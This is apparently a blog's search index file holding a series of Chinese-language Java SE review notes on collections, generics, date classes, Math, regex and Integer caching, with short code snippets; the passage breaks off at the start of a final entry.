<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[javaSE复习之——Collections工具类与集合总结]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Collections%E5%B7%A5%E5%85%B7%E7%B1%BB%E4%B8%8E%E9%9B%86%E5%90%88%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Collections中的常用方法 Collections.sort(list) 把集合进行排序 Collections.banarySearch(list, 需要查的元素) 用二分查找法查询某个集合中的元素，二分查找法前提是集合是有序的，找不到返回-(插入点 - 1） Collections.max(list) 根据默认排序返回集合中最大的元素 Collections.min(list) 根据默认排序返回集合中最小的元素 Collections.reverse(list) 反转集合 Collections.shuffle(list) 随机置换，可以洗牌。 集合总结 Collection List(存取有序,有索引,可以重复) ArrayList 底层是数组实现的,线程不安全,查找和修改快,增和删比较慢 LinkedList 底层是链表实现的,线程不安全,增和删比较快,查找和修改比较慢 Vector 底层是数组实现的,线程安全的,无论增删改查都慢 如果查找和修改多,用ArrayList如果增和删多,用LinkedList如果都多,用ArrayList Set(存取无序,无索引,不可以重复) HashSet 底层是哈希算法实现 LinkedHashSet底层是链表实现,但是也是可以保证元素唯一,和HashSet原理一样 TreeSet 底层是二叉树算法实现 一般在开发的时候不需要对存储的元素排序,所以在开发的时候大多用HashSet,HashSet的效率比较高 TreeSet在面试的时候比较多,问你有几种排序方式,和几种排序方式的区别 Map HashMap 底层是哈希算法,针对键 LinkedHashMap底层是链表,针对键 TreeMap 底层是二叉树算法,针对键 ps：开发中用HashMap比较多 面试题之——TreeSet或者TreeMap有几种排序方式和区别TreeSet或者TreeMap排序的两种方式 第一种 构造TreeSet集合什么都不传，就默认使用类中的Comparable的顺序，也就是compareTo方法。（传入集合的自定义对象实现了Comparable接口则用自定义类中重写的compareTo方法） 第二种 构造TreeSet集合传入Comparator比较器，那么优先按照比较器顺序排序。 引用自javaSE复习之——TreeSet类 ps： 1、在开发中，单列集合存储重复元素优先考虑ArrayList，不重复的元素优先考虑HashSet，双列集合直接考虑HashMap 2、单列集合（collection）中Set集合类型其实底层都依赖map集合，它封装了map集合，当中只使用到了key，而value用固定的值替代(Object对象)。 3、tree类型的map和set集合平时都不常用，但是面试会用，一般问你有几种排序方式,和几种排序方式的区别]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>集合总结</tag>
        <tag>Collections工具类</tag>
        <tag>面试题之——TreeSet或者TreeMap有几种排序方式和区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Map类]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Map%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[map集合的概述 它是将键映射到值的对象，类似python中的字典，它是无序的。 特点 1、一个map对象不能包含重复的键 2、一个键只能映射到一个值 3、map接口的实现分为hashMap和treeMapps：只要是hash算法实现的集合，那么它都是无序的。 4、map集合不能直接进行迭代。 解决方法1（底层调用原map集合太多）利用keySet获取所有键的对象，然后迭代这个对象逐个get获取值，这样可以从侧面迭代map集合。ps：利用增强for循环可以更简便的拿到map集合中的每个值。 解决方法2（推荐使用）：利用entrySet方法获取一个键值对Entry对象，然后迭代或者增强for循环这个Entry对象然后逐个获取值即可。 注意事项：传入引用数据类型时，必须重写hashCode和equals方法 map和colllection的不同： 1、map是双列的，collection是单列的 2、map键唯一，collection只有它的子体系Set是唯一的ps：其实set集合是依赖与map的hash算法的，只是set集合中把map集合封装了一下，里面只使用了键，而值用object对象填充 3、Map的数据结构只针对键有效，和值无关；collection的数据结构针对元素有效 创建map对象1map&lt;String, Integer&gt; map = new hashMap&lt;&gt;(); map集合中的方法 添加方法： .put(key, value)向map集合中添加一个键值对元素，新添加返回null，覆盖返回被覆盖的值 删除方法： .clear()删除全部键值对元素 .remove(key)删除指定键对应的键值对 判断方法： .containsKey(key)判断集合中是否包含指定的键 .containsValue(value)判断集合中是否包含指定的值 .isEmpty()判断集合是否为空 获取功能： .entrySet()拿到map集合的键值对象，返回set&lt;map.Entry&lt;K,V&gt;&gt;ps：Map.Entry是Map接口的内部接口，它实现了将键和值封装成了一个Entry对象，储存再Set集合中。 .get(key)根据键获取值 .keySet()获取集合中所有键的集合，返回Set .values()获取集合中所有值的集合，返回Collection 长度功能： .size()返回键值对个数 linkedHashMap特点 它是有序的，怎么存就怎么打印 TreeMap特点： 1、可以用来排序，值是唯一的，等等 2、传入引用数据类型时，必须重写compareTo方法，否则无法判断值的唯一性，会报错。 3、具体笔记在TreeSet集合中介绍 hashtable和hashMap区别（面试题）： 共同点： 1、底层都依赖hash算法 2、都是双列集合 不同点： 1、HashMap是线程不安全的，效率高，jdk1.2版本出现的 2、Hashtable是线程安全的，效率相对第，jdk1.0版本出现的 3、HashMaop可以储存null键和null值 4、Hashtable不可以储存null键和null值]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Map类</tag>
        <tag>linkedHashMap类</tag>
        <tag>TreeMap类</tag>
        <tag>hashtable和hashMap区别（面试题）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——TreeSet类]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94TreeSet%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[TreeSet的概述 它是一个二叉树集合，小的（负数）放在左边，大的（正数）放在右边，并且对集合元素进行排序，并且可以保证元素的唯一性，也就是去除重复，它的主要功能是排序。它依赖map集合 TreeSet特点： TreeSet集合存储元素取决于compareTo方法的返回值。 返回0：表示作比较的两个对象是相等的，这时集合不存这个元素。 返回负数：表示要存入的元素小于上一个作比较元素，然后把这个元素放在作比较元素的左边，如果它的左边还有元素就再进行比较 返回正数：表示大于上一个元素，这时把这个元素放在上一个元素的右边，如果右边还有元素，就再进行比较。 TreeSet存元素的原理 首先存入第一个元素（根元素），然后再存入第二个元素时调用compareTo方法取到返回值，然后根据返回值存元素； 如果之前已经存了n个元素，那么调用compareTo逐次与每个元素作比较， TreeSet取元素原理 从最小的开始取，也就是从左向右取，先取根元素左边的元素，如果根元素左边的元素下面还有元素就先从那里开始取，这里也是从左到右的原理，取根元素右边元素也是同理，从左边向右边取元素，如果左边或右边元素下面还有元素，那么也是遵循从左到右的原则。 注意：左边元素全部取完后再慢慢向右边取 为什么存入自定义对象的时候会报错？ 原因： 因为TreeSet会对集合元素进行排序，而它不知道自定义对象按照什么方法来排序，所以会报错。 解决方法： 让自定义对象这个类去实现Comparable接口，然后重写compareTo方法，此方法返回0则集合只能存一个对象，返回1按照存的顺序排序，返回-1按照存的顺序的倒叙存。 重写compareTo例子1234public int compareTo(Student o) &#123; int num = o.sum - this.sum; return num == 0 ? 1 : num;&#125; ps：比较字符串可以调用字符串的conpareTo方法比较 TreeSet比较器Comparator的概述 可以自定义对TreeSet集合进行排序 使用方法 首先创建一个类并且让这个类实现Comparator接口，然后重写compare方法，最后在创建TreeSet集合对象的时候创建这个类的对象传入即可。 特点 compare方法中第一个参数是调用的对象，第二个参数是被比较集合中的对象 两种排序方式的区别 1、构造TreeSet集合什么都不传，就默认使用类中的Comparable的顺序，也就是compareTo方法。（传入集合的自定义对象实现了Comparable接口则用自定义类） 2、构造TreeSet集合传入Comparator比较器，那么优先按照比较器顺序排序。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>TreeSet类</tag>
        <tag>Comparator比较器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——HashSet类]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94HashSet%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[概述 他没有自己特殊的方法，它的方法和Collection一样，HashSet集合不能存重复的数据，并且是无顺序的。 特点： 1、没有索引 2、不可以重复 3、无顺序（存和取不一致） 为为什么要存储自定义对象 因为别人的类我们不知道它重写了哪些方法来保证元素的一致性。 HashSet集合存集合的原理 加入每个元素都会先调用hashCold方法来生成一个Hash值，这个值就相当于存那个元素的地址，如果hash值不一样就不会调用equals方法判断，如果hash值相同就通过equals方法对比在同一个地址中的数据是不是相同的，相同丢弃不相同就存入。 HashSet中遇到的常见问题： 为什么在集合中存入自定义对象的时候重复的数据也会被存进去？ 原因1:因为父类的hashCold方法会为每一个元素生成不一样的hash值，所以导致地址不一样 原因2:父类的equals方法对比的时对象的地址，而不是对象里面的值 解决方法：在自定义的类中重写equals方法和hashCold方法 为什么尽量使用计算hash值的方法来判断两个我们知道相等的对象是否相等？ 原因：HashSet集合加入元素的顺序是先判断hash值如果hash值一样就调用equals判断，如果我们用算法让相同的对象值计算出相同的hash值，不同的对象值计算出不同的hash值，那么就可以让程序少调用一次equals方法，这样可以提高效率。 注意事项：重写hashCold方法时，属性相同的对象hash值一定要一样，属性不一样的对象hash值要尽量不一样（提高效率） 重写hashCold中的面试题： 为什么使用Eclipse重写的hashCold方法中，为了让传入对象计算的hash值不一样，而定义的一个用来算法计算的值是31？ 原因1：它是一个质数，它只能被1和本省整除，这样可以减小两个对象计算的hash值相同的概率 原因2：31这个数不大也不小，太小了计算的值容易重复，太大了容易超过int范围。 原因3：31这个数好算，它是2的5次方-1，也就是2的二进制位向左移动5位。 LinkedHashSet的概述 它的底层是链表实现,并且是非线程安全的，也是Set集合中唯一 一个能保证怎么存就怎么取的集合对象，因为它的父类是HashSet，所以也是保证元素唯一的，它的原理与HashSet一样。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>HashSet类</tag>
        <tag>LinkedHashSet类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——增强for循环、JDK5新特性与可变参数]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A2%9E%E5%BC%BAfor%E5%BE%AA%E7%8E%AF%E3%80%81JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B8%8E%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[增强for循环的概述 简化数值与集合的遍历，不需要那么麻烦了，它的底层依赖的是iterator迭代器。 使用方法：123for(创建一个临时变量储存数据：需要遍历的数组或者集合) &#123; 在这里使用那个临时变量就好了。&#125; eclipse可以直接输入fore然后按提示快捷键 ps：只要可以用迭代器迭代，那么就可以用增强for循环。 JDK5新特性 可以导入类里的静态方法，不过意义不大，开发不用，但是要看得懂。 使用方法1import static 包名.类名.方法名 可变参数的概述 定义方法的时候不知道该定义多少个参数,我们就可以用到可变参数 格式1public void a(数据类型 ... 变量名) 注意事项 1、这里的变量其实底层是一个数组 2、如果一个方法里有多个参数，那么可变参数一定要放在最后面]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>增强for循环</tag>
        <tag>JDK5新特性</tag>
        <tag>可变参数</tag>
        <tag>静态导入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——泛型]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%B3%9B%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[泛型的概述 可以把泛型理解成“参数化类型”，他可以在类、接口和方法中使用，分别被称为泛型类、泛型接口、泛型方法。 泛型类的使用1Collection&lt;泛型&gt; = new Collection&lt;&gt;(); 定义方法的作用 指定自己需要使用的数据类型。 泛型接口的定义：1interface Inter&lt;E&gt; &#123;&#125; 泛型类的定义与接口的实现12class press&lt;E&gt; implements Inter&lt;String&gt; &#123; &#125;//在这个类中用E代替传入的数据类型即可 定义类的作用： 在创建这个类的引用或者对象时，可以自己指定数据类型。ArrayList这个类就是这样定义的。 泛型类中方法使用定义好的泛型1public E aa() &#123;&#125; ps：在创建这个泛型类的时候就把这个E给赋值了，赋的值时自己定义的数据类型，可以在方法中直接使用E，当然这个E可以定义成其他的符号。 泛型方法的定义1public&lt;T&gt; aaa() &#123;&#125; 作用： 让类中的某个方法有自己的泛型。 注意事项： 1、在定义了泛型的类中最好不要定义某个方法特有的泛型2、静态方法因为在类的加载就加载了，所以不能使用类的泛型，只能声明自己的泛型。 ps：可以把泛型看作一个变量来理解。 泛型定义示例12345678910111213141516public static void main (String ages[]) &#123; person&lt;String&gt; p =new person&lt;String&gt;(); //创建完之后，E就等于String了 p.b(true); //调用后b这个方法中T的类型就等于Boolean了 &#125;class person&lt;E&gt; &#123;private E a;public&lt;T&gt; void b(T tt) &#123; E s; System.out.println(tt); &#125;&#125; 泛型作用 限制某个集合只能存什么类型的数据,防止出现数据的安全隐患。 泛型的好处： 1、提高了安全性（因为能限制只能存什么数据，所以把运行期的错误转移到了编译期） 2、省去了数据需要从Object强转的麻烦 泛型的注意事项 1、泛型的数据类型一定要时引用数据类型。 2、不要把泛型数据类型定义成Object，因为没有任何意义。 jdk1.7版本新特性：菱形泛型 解析：创建对象时，等号前面&lt;&gt;里写了泛型，那么后面&lt;&gt;里可以不写数据类型，因为两个尖括号放一起很想菱形，所以叫做菱形泛型。 泛型高级之——通配符？ &lt;?&gt; 1ArrayList&lt;?&gt; a = new ArrayList&lt;&gt;(); 当我们遇到右边返回对象时，这时我们不知道返回对象的泛型(类型)是什么，那么我们左边就可以用通配符”?”来替代。 &lt;？ extends E&gt; 向下限定，表示只能传入E或者它的子类。 泛型的边界定义 &lt;？ extends E&gt;： 泛型固定上边界，向下限定，表示只能传入E或者它的子类。 &lt;? super E&gt;: 泛型固定下边界，向上限定，表示只能传入E或者它的父类]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>泛型</tag>
        <tag>泛型边界定义</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Collection集合框架]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Collection%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[集合与数值的区别 1、数组即可以存基本数据类型也可以存引用数据类型(对象) 2、集合只能存引用数据类型，如果存基本数据类型，那么系统会自动装箱成对象。 3、数组的长度是固定的，不能自动增长 4、集合的长度是可变的。 集合与数组的缺点 数组： 长度是固定的，不能自动增加 集合： 会浪费很多空间， 原因：它的部分底层是数组，它增加长度的方法是首先创建长度为10的数组，然后不够就1.5倍增加，直到够存下为止。 Collection集合的继承体系图:123456789101112131415 Collection 单列集合的根接口,它是抽象类，一般用来父类引用子类对象 / \ / \ / \ List Set 有序，有索引，可重复储存 无序，无索引，不可重复储存（我们只要学习如何保证元素不是重复的） / | \ / \ / | \ / \ / | \ / \ ArrayList LinkedList Vector HashSet TreeSet 查改快(直接索引查找) 查改慢(要遍历) 查改略慢 增删慢(考虑增容、拷贝) 增删快 增删慢 线程不安全 线程安全 线程安全 数组实现 链表实现 数组实现 Collection集合的方法 .add() 向集合中存入数据，list集合返回true，Set集合如果集合有相同的数据返回false，否则true。 .remove() 删除 .toArray() 把集合转换成数组输出，如果ArrayList对象加了泛型，那么可以传入某类型数组对象，然后用某类型数组直接引用。 .addAll() 把传入集合加入到调用的集合中 .removeAll() 删除调用集合中与传入集合交集的数据 .containsAll() 判断调用集合中是否有传入集合的数据 .retainAll() 取两个集合的交集，如果传入类有交集那么会把那两个值覆盖调用集合的值，调用的集合改变了就返回true，否则false List集合方法： .add(int index,) 在某个索引添加指定数据 .remove(int index,) 在某个索引删除指定数据，删除了什么就返回什么。一个小问题：remove不会自动装箱，可能会识别错误导致程序出错 .get(int index,) 输出索引对应的数据，所以list可以直接用这个方法遍历数组，不用迭代了。 .set(int index,) 设置指定索引的数据 ps：集合containsAll、removeAll等方法底层都是基于equals方法的，所以在集合中处理对象时，传入对象需要重写object父类的equals方法才能实现效果。 集合迭代的概述： 集合是存储元素，而这些元素需要查看，那么就需要用到迭代，迭代也就是遍历。 迭代使用示例：123456789Collection c = new ArrayList();Iterator it = c.iterator();//.hasNext()判断是否还有数据While(it.hasNext())&#123; System.out.println(it.next()); //.next()获取下一个数据&#125; 迭代器修改数据产生的异常与解决方案： 异常： 在利用迭代器遍历数据时，如果我们在遍历的中途给集合添加数据，那么会出现异常 异常原因： 在创建iterator迭代器时已经把集合的数量给了迭代器，如果中途给集合添加数据就是并发修改了。 解决方法： 使用iterator这个list独有的迭代器，然后调用Itterator自己的add添加数据。 Vector的概述 jdk刚出来他就有了，在jdk1.2版本加入了collection体系，后来因为vector有的功能ArrayList都有，而且还比他强大，所以不用vector了。 Vector与ArrayList的区别 Vector是线程安全的，它的效率相对低也就是查询相对慢； 反之ArrayList它是线程不安全的，但是效率高。 LinkedList集合的概述 使用链表实现的list集合。 数组实现集合与链表实现集合的优缺点： 数组： 查询修改快，但是增删慢 链表： 查询修改慢，但是增删快 集合的面试题——之ArrayList、Vector、linkedList区别： ArrayList： 数组实现，查询修改快，但是增删慢，它是线程不安全的。 LinkedList： 链表实现，查询修改慢，但是增删快，它是线程不安全的。 Vector： 数组实现，相对ArrayList查询慢效率低，因为它是线程安全的。 他们三个的用法： 1、查询多用ArrayList2、增删多用LinkedList3、增删查询都多用ArrayList4、Vector面试的时候用，虽然它是线程安全的，但是在需要线程安全的时候也不用它。 LinkedList的特殊方法 .addFirst() 与 .addLast() 在链表头部与尾部添加数据 .getFirst 与 .getLast() 获取链表头部或者尾部数据 .removeFirst 与 .removeLast() 删除链表头部或者尾部数据 .get() 获取链表指定位置的数据]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Collection集合</tag>
        <tag>集合</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Date、SimpDateFormat、Calendar类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Date%E3%80%81SimpDateFormat%E3%80%81Calendar%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Date的概述 获取瞬间时间，精确到毫秒。 例子： 12345Date d = new Date();//打印d会显示打印时瞬间的电脑系统时间Date d = new Date(0)//这样会打印1970年1月1日的8点 解析： 1、为什么是1970年1月1日：首先1970年1月1日是c语言和UNLX的生日，然后因为最早的计算机是32位的，32位最多表示的时间是68年，而最早出现的UNLX系统考虑到计算机产生的年代和应用的时限，所以综合取了1970年1月1日为UNLX 的纪元时间开始。 2、为什么是8点：因为我们电脑的时区是东8区，所以显示的是8点。 Date的方法 .getTime() 通过时间对象获取毫秒值 .setTime() 设置毫秒值，设置1000那么输出时间对象的时间为：1970年1月1日8点钟多一秒。 SimpDateFormat的概述 1、它是DateFormat的子类，拥有DateFormat的所有功能。 2、DateFormat 是日期/时间格式化子类的抽象类 3、SimpleDateFormat 是一个以与语言环境有关的方式来格式化和解析日期的具体类。它允许进行格式化（日期 -&gt; 文本）、解析（文本 -&gt; 日期）和规范化。总的来说，它们就是一个日期格式化类，构造方法传入格式规则可以按照相应的规则格式化日期。 方法 .format(Date d) 把日期类转换为String类 .parse(String str) 把时间字符串转换成日期对象，需要配合异常使用。 SimpleDateFormat类的实例12345678Date d = new Date(0);//获取当前瞬间时间SimpleDateFormat sdf = new SimpleDateFormat("yyyy年MM月dd日 HH:mm:ss");//创建日期格式化类并且进行格式化System.out.println(sdf.format(d));//格式化并且输出时间，结果为：1970年 Calendar类的概述 它把K的很多方法都替代掉了，Calendar 类是一个抽象类，它为特定瞬间与一组诸如 YEAR、MONTH、DAY_OF_MONTH、HOUR 等 日历字段之间的转换提供了一些方法，并为操作日历字段（例如获得下星期的日期）提供了一些方法。 方法： .getInstance() 获得一个日历，并且是基于当前时间的，返回一个Calendar的子类，可以父类引用子类对象 .get(int field) 返回指定日历字段的值，日历字段代表年月日那些，比如1那么就表示年，不过为了方便，Calendar给出了字段常量，比如Calendar.YEAR常量它的值是1，代表了年。 .add(int field,int i1) 指定字段的值加减，当前年为2018 例当前年为2018：add(Calendar.YEAR，-1)那么返回2017 .set(int year,int month,int day) 修改指定字段,可以直接修改年月日，也可以像add那样修改年等。 代码示例：123456//获取今天年月日和星期Calendar c = Calendar.getInstance();//获取一个日历System.out.println(c.get(Calendar.YEAR) + "年" + c.get(Calendar.MONTH) + 1 + "月" + c.get(Calendar.DAY_OF_MONTH) + "日\n星期" + (c.get(Calendar.DAY_OF_WEEK) - 1));]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Date类</tag>
        <tag>SimpDateFormat类</tag>
        <tag>Calendar类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——BigInteger与BigDecimal类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94BigInteger%E4%B8%8EBigDecimal%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[BigInteger的概述 不可变的任意精度的整数。所有操作中，都以二进制补码形式表示 BigInteger（如 Java 的基本整数类型）。 BigInteger 提供所有 Java 的基本整数操作符的对应物，并提供 java.lang.Math 的所有相关方法。 另外，BigInteger 还提供以下运算：模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。 ps：了解一下BigInteger类可以存下任意长度的数值就行了。 与BigInteger不同的是，BigDecimal是小数####注意事项： 开发中创建BigDecimal对象进行运算时，给它有参构造传入的值要以字符串形式传入，如果以数值形式传入的话会损失精度。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>BigInteger类</tag>
        <tag>BigDecimal类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——System类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94System%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[System类的概述 System类有标准输入、标准输出和错误输出流； 对外部定义的属性和环境变量的访问；加载文件和库的方法； 还有快速复制数组的一部分的实用方法。 字段： err标准错误流 in标准输入流 out标准输出流 System类的方法 .gc() 运行垃圾收集器，虽然objcket类中有一个filalize的方法会自动清理垃圾，但是垃圾没有超过一个量是不会自动收集的。 .exit() 退出java虚拟机jvm，传入值为0是正常终止，非0为异常终止。 .currentTimeMillis() 返回当前时间与协调世界时 1970 年 1 月 1 日午夜之间的时间差（以毫秒为单位测量）。 ps：经常应用在计算程序运行时间，从程序开始记录一次，结束记录一次，然后减去即可。 .arraycopy(Object src, int srcPos, Object dest, int destPos, int length) 从指定源数组中复制一个数组，复制从指定的位置开始，到目标数组的指定位置结束。 参数：src - 源数组。srcPos - 源数组中的起始位置。dest - 目标数组。destPos - 目标数据中的起始位置。length - 要复制的数组元素的数量。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>System类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Random类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Random%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Random概述 利用传入的随机数种子，生成一个伪随机数 Random类的方法 .nextInt(Int i); 生成一个从0到i的随机数，包括0不包括i 例子1234567Random r = new Random();//不输入种子的话系统自动使用纳秒来当作种子r.nextInt(100);//生成了0到100的随机数，不包括100//ps：如果要生成1-100的随机数，直接+1]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Random类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Math数学类的使用]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Math%E6%95%B0%E5%AD%A6%E7%B1%BB%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Math类的方法 int abs(int a) 取绝对值 double ceil(double a) 向上取整数返回double，例子：输入12.56输出一个13.0 double floor(double a) 与上同理，但是向下取整数 int max(int a,int b) min自学 取大的值 double pow(double a,double b) a是底数，b是指数 double random() 生成0.0到1.0之间的随机小数，包括0.0不包括1.0 int round(float a) 参数为double的自学 四舍五入 double sqrt(double a) 开平方 输入4返回2.0 输入9返回3]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Math类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——正则表达式]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[正则表达式概念 就是一种规则，可以在某一段字符串中以某一个特殊的规则，取到自己想要的那段字符串。 String中的正则表达式方法： .matches() 是否匹配这个正则表达式，返回true或者false .replaceAll(String regex,String xxx) 替换所有匹配到的字符串 ps：使用正则非常好用，例：regex的内容为\d 那么那个字符串的所有数字都会被替换 .replaceFirst(String regex,String xxx) 替换找到的第一个字符串 .split() 以某一个字符串切割字符串 正则表达式专属类与方法实现方法：12345678Pattern p = Pattern.compile("a*b");//把正则表达式编译到模式中Matcher m = p.matcher("aaaaab");//使用上面创建的对象来匹配一个字符串boolean b = m.matches();//全部匹配到了则返回true 实战例子：12345678910111213String str1 = "我手机号码是18734126341，曾经用过17707053381，曾经还用过13228865165";Pattern p = Pattern.compile("1[356789]\\d&#123;9&#125;");//把正则表达式编译到模式中Matcher m = p.matcher(str1);//创建一个匹配器while(m.find())//匹配下一个能成功匹配的字符串，成功返回trueSystem.out.println(m.group());//返回上一个匹配到的字符串 正则表达式字符类 表达式 获取结果 [abc] a、b 或 c（简单类） [^abc] 任何字符，除了 a、b 或 c（否定） [a-zA-Z] a 到 z 或 A 到 Z，两头的字母包括在内（范围） [a-d[m-p]] a 到 d 或 m 到 p：[a-dm-p]（并集） [a-z&amp;&amp;[def]] d、e 或 f（交集） [a-z&amp;&amp;[^bc]] a 到 z，除了 b 和 c：[ad-z]（减去） [a-z&amp;&amp;[^m-p]] a 到 z，而非 m 到 p：[a-lq-z]（减去） 正则表达式预定义字符类 表达式 获取结果 . 任何字符（与行结束符可能匹配也可能不匹配） \d 数字：[0-9] \D 非数字： [^0-9] \s 空白字符：[ \t\n\x0B\f\r] \S 非空白字符：[^\s] \w 单词字符：[a-zA-Z_0-9] \W 非单词字符：[^\w] 正则表达式Greedy 数量词 表达式 获取结果 X? X，一次或一次也没有 X* X，零次或多次 X+ X，一次或多次 X{n} X，恰好 n 次 X{n,} X，至少 n 次 X{n,m} X，至少 n 次，但是不超过 m 次 正则表达式的分组功能 1、使用（）进行分组 例子：(.)\1(.)\2 代表：第一组再出现一次，第二组也再出现一次，也就是\1同等与上一组出现的数据 例子：123str1 = “高高兴兴”str1.matches("(.)\\1(.)\\2")//返回true 2、$符号，在替换时可以获取到正则表达式中某组获取到的字符，$1代表获取到第一组中的字符串 例子：12"问问啊啊".replaceAll("(.)\\1","$1");//替换后的结果为：问啊 $1 获取到了(.)的值]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Integer中的常见面试题]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Integer%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[代码示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.heima.wrapclass;public class Demo5_Integer &#123; /** * @param args */ public static void main(String[] args) &#123; Integer i1 = new Integer(97); Integer i2 = new Integer(97); System.out.println(i1 == i2); //false System.out.println(i1.equals(i2)); //true System.out.println("-----------"); Integer i3 = new Integer(197); Integer i4 = new Integer(197); System.out.println(i3 == i4); //false System.out.println(i3.equals(i4)); //true System.out.println("-----------"); Integer i5 = 127; Integer i6 = 127; System.out.println(i5 == i6); //true System.out.println(i5.equals(i6)); //true System.out.println("-----------"); Integer i7 = 128; Integer i8 = 128; System.out.println(i7 == i8); System.out.println(i7.equals(i8)); //true /* * -128到127是byte的取值范围,如果在这个取值范围内,自动装箱就不会新创建对象,而是从常量池中获取 * 如果超过了byte取值范围就会再新创建对象 * * public static Integer valueOf(int i) &#123; assert IntegerCache.high &gt;= 127; //i&gt;= -128 &amp;&amp; i &lt;= 127 if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); &#125; */ &#125;&#125; 总结 底层代码可以理解成一个数组，这个数组索引0对应着-128、255对应着127，当传入的值在-128 - 127之间时自动装箱时会直接在这个数组中取值，进而引用地址是一样的，所以上面返回了true]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Integer</tag>
        <tag>Integer面试题</tag>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——JDK5新特性之_自动拆箱与装箱]]></title>
